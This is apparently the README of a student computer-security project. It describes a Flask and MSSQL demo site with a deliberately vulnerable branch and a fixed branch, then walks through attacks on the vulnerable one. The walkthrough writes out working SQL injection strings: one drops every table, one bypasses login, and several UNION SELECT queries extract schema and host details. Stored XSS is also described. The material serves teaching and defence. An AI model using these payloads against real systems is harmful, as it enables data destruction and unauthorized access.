# Computer Security - Final Project

In this project, we developed a web-based imaginary communications company called Comunication_LTD. This company markets Internet packages and has a database that includes, among other things, information about the company's customers, various packages, and the sectors to which it markets its products.

We used the following technologies in our project:
| Database  | Web framework | Virtualization | Template engine |
| :---:   | :---: | :---: | :---: |
| Microsoft SQL 2022 | Flask   | Docker   | Jinja2 |

* The UI used plain HTML and CSS (no CSS frameworks).

## Switch Between The Vulnerable And Safe Codes
This project has two branches. The first one has vulnerable code (for SQL injection and XSS attacks), and the second one is not vularable and shows the solutions to those attacks.

You can find both of those versions in this repo:

* Invulnerable/Safe Version - https://github.com/eranbabayov/final_course_project/tree/main

* Vulnerable/Unsafe Version - https://github.com/eranbabayov/final_course_project/tree/hacked_version

## Walkthrough / Examples
### Sql Injections
#### Register
Since there is no real information displayed on the screen from the registration (aside from maybe the username, which will be a little harder or near impossible to utilize), we can use an example that allows us to insert other statments, for example, dropping a table.

We can write the following string in the username:
```bash
a','b','c'); DROP TABLE user_sectors;  DROP TABLE password_history; DROP TABLE user_info; DROP TABLE clients; DROP TABLE users;--
```
![register](https://github.com/eranbabayov/final_course_project/assets/55022020/fe51f12b-dc3e-466d-b427-5e725f62049a)

This will cause the server to show an error (because it's trying to insert things into a dropped table), but we can use `sqlcmd` to verify and see that the database isn't accessible and the tables were indeed dropped.
![error_server](https://github.com/eranbabayov/final_course_project/assets/55022020/7aa6a237-6291-4e7d-b8b7-c05c10cada76)
![no_tables](https://github.com/eranbabayov/final_course_project/assets/55022020/097ca268-d644-46ca-9a07-196379bf8aca)

#### Login
For the login form, we can use a SQL statement to login to any user.
We can utilize this example string to login to the first user in the database:
```bash
' or 1=1 --
```
![login_try](https://github.com/eranbabayov/final_course_project/assets/55022020/776824a6-a129-4892-947d-961805997ad3)
![login_done](https://github.com/eranbabayov/final_course_project/assets/55022020/522a6c49-335c-4db5-912c-eca00c8a0218)

#### Dashboard
In the dashboard, we actually have the option to search for a client and display the client information on the screen. We can utilize this to extract information from the database. using a clever select statement with union (the number of nulls is there to match the number of columns in the client table and can be easily found by just bruteforcing it one by one). 

Here are a few examples of things you can insert and information you can extract
* The database name:
```bash
a' UNION ALL SELECT NULL, NULL, NULL, NULL,  NULL, NULL, NULL, NULL,DB_NAME();--
```
![db_name](https://github.com/eranbabayov/final_course_project/assets/55022020/8bf70a3a-d2c2-4f72-8882-498fd6a8b578)

* The host names:
```bash
a' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,(HOST_NAME());--
```
* The columns names:
```bash
a' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,(SELECT column_name + ', ' AS 'data()' FROM information_schema.columns FOR XML PATH(''));--
```
* The tables names:
```bash
a' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,(SELECT name  + ', ' AS 'data()' FROM CommunicationLTD..sysobjects WHERE xtype = 'U' FOR XML PATH(''));--
```
![tables_name](https://github.com/eranbabayov/final_course_project/assets/55022020/698ce64b-3a55-43e6-9846-02fc1bbe4acb)


### Xss Injection
In this version of the code, by inserting a new client, we can actually insert client-side scripts into the web page. That script will be run by everyone that searches for a specific user with matching information (or searches for all users).

Here's a detailed example of this attack:

![adding_client](https://github.com/eranbabayov/final_course_project/assets/55022020/c6c78080-b548-4505-b9b4-e44e20b3c3b3)
![xssed](https://github.com/eranbabayov/final_course_project/assets/55022020/28ece52d-ec33-48cc-8948-39de6065eb5d)
![xss_in_table](https://github.com/eranbabayov/final_course_project/assets/55022020/558e3fde-cf8a-46bb-b59b-0eb39fe14302)

## Setup / Run
### Prerequisites

Docker and its [prerequisites](https://docs.docker.com/desktop/install/windows-install/#system-requirements) are installed and **running**
```bash
docker ps
```

### Setup / Run
> The setup of the program or re-running can be done automatically with the same command,`docker compose up`.

1. Change your desired password in the `.env` file. Make sure your password meets [Microsoft's Password Policy](https://learn.microsoft.com/en-us/sql/relational-databases/security/password-policy?view=sql-server-ver16#password-complexity).

2. Run the `docker-compose.yml` file with the following command:
```bash
docker compose up
```
